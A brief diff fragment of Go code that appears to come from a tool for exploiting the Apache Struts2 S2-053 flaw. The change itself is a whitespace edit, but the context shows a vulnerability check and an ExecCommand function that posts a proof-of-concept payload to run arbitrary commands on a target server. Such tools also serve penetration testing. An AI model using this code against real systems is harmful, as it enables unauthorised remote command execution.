@@ -18,7 +18,7 @@ func Check(targetUrl string, postData string) {
     } else {
         fmt.Println("Struts2-053 Not Vulnerable.")
     }
-
+    
 }
 func ExecCommand(targetUrl string, command string, postData string) {
     respString := utils.PostFunc4Struts2(targetUrl, postData, "", utils.POC_s053_exec(command))
